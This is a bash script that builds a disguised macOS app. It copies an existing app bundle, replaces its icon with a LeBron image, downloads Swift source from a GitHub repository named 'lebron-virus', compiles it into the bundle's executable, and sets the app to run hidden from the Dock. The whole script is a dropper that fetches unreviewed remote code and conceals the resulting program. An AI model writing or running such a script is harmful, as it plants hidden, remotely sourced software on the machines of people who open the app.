#!/usr/bin/env bash

set -euo pipefail

cp -r ~/lebronapp.app ~/lebronappcopy.app
sips -z 22 22 ~/lebron.png --out ~/lebronappcopy.app/contents/Resources/icon.png

APP_BUNDLE="$HOME/lebronappcopy.app"
PLIST="$APP_BUNDLE/Contents/info.plist"
SWIFT_SRC="$APP_BUNDLE/Contents/MacOS/main.swift"
BINARY_NAME="$APP_BUNDLE/Contents/MacOS/applet"

curl "https://raw.githubusercontent.com/Very-cool-guy/lebron-virus/main/resources/main.swift" > $SWIFT_SRC

xcrun swiftc "$SWIFT_SRC" -o "$BINARY_NAME" -framework AppKit

chmod +x "$BINARY_NAME"

/usr/libexec/PlistBuddy -c "Add :LSUIElement bool true" "$PLIST" 2>/dev/null || \
    /usr/libexec/PlistBuddy -c "Set :LSUIElement true" "$PLIST"

touch ~/lebronappcopy.app
